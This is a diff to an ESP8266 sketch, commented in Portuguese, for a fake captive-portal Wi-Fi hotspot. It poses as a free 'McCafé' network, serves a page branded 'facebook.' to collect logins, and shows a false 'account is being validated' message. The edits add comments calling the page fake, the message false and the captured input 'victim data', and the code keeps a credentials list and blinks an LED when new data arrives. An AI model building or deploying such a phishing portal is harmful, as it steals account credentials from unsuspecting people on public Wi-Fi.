@@ -6,12 +6,12 @@
 #include <ESP8266WebServer.h>
 
 // Configuração do "AP".
-#define SSID_NAME "McCafé - Grátis."   //Nome da rede do WI-FI , McCafé ótimo exemplo kkkkkkkk.
-#define TITLE "McCafé"
-#define SUBTITLE "facebook."
+#define SSID_NAME "McCafé - Grátis."   // Nome da rede do WI-FI , McCafé ótimo exemplo kkkkkkkk.
+#define TITLE "McCafé"  // Nome do titulo na Pagina Fake.
+#define SUBTITLE "facebook."  // Subtitulo, recomendo não trocar.
 #define BODY "Faça check-in para WIFI Grátis."
 #define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
+#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."  // Mensagem falsa de validação.
 #define PASS_TITLE "Credenciais"
 #define CLEAR_TITLE "Limpo."
 
@@ -99,7 +99,7 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>Lista de credenciais resetada.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
-void BLINKPASS() {//Piscar 3 vezes quando Receber uma "Password".
+void BLINKPASS() {//Piscar 3 vezes o Led da placa quando receber uma "Dados da vitima".
   int count = 0;
   while(count < 3){
     digitalWrite(BUILTIN_LED, LOW);
